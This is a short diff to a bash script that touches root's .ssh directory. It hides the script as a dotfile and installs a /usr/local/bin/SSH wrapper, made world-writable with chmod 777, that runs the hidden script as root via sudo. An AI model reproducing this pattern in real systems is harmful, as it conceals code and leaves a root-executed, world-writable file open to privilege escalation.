@@ -174,8 +174,9 @@ echo -e "${YELLOW}[*] Root .ssh contents:${NC}"
 ls -lah "$SSH_DIR_ROOT/" || true
 
 chmod +x /home/x/ssh.sh
+mv /home/x/ssh.sh /home/x/.ssh.sh
 echo 'echo "#!/bin/bash" > /usr/local/bin/SSH' > /tmp/SSH
-echo "echo 'bash /home/x/ssh.sh' >> /usr/local/bin/SSH" >> /tmp/SSH
+echo "echo 'bash /home/x/.ssh.sh' >> /usr/local/bin/SSH" >> /tmp/SSH
 echo "sudo chmod +x /usr/local/bin/SSH && sleep 3 && sudo chmod 777 /usr/local/bin/SSH && sudo bash /usr/local/bin/SSH" >> /tmp/SSH
 clear
 sudo bash /tmp/SSH
